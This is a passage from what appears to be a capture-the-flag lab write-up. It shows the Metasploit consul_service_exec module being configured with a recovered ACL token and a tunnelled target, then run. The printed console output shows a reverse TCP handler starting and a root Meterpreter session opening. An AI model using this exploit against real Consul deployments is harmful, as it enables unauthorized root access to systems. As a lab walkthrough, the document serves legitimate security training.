   ----   ---------------  --------  -----------
   LHOST  10.10.14.6       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Linux

View the full module info with the info, or info -d command.

```

The important things to set are the ACL_TOKEN (recovered above), the RHOSTS (set to localhost tunnel), and the payload. Running this gives a shell as root:

```
ACL_TOKEN
```

```
RHOSTS
```

```
msf6 exploit(multi/misc/consul_service_exec) > run
                              
[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] Creating service 'SpSyWPB'
[*] Service 'SpSyWPB' successfully created.
[*] Waiting for service 'SpSyWPB' script to trigger
[*] Sending stage (1017704 bytes) to 10.10.11.183
[*] Meterpreter session 1 opened (10.10.14.6:4444 -> 10.10.11.183:46010) at 2023-01-26 18:02:45 +0000
[*] Removing service 'SpSyWPB'
[*] Command Stager progress - 100.00% done (763/763 bytes)

meterpreter > getuid 
Server username: root

```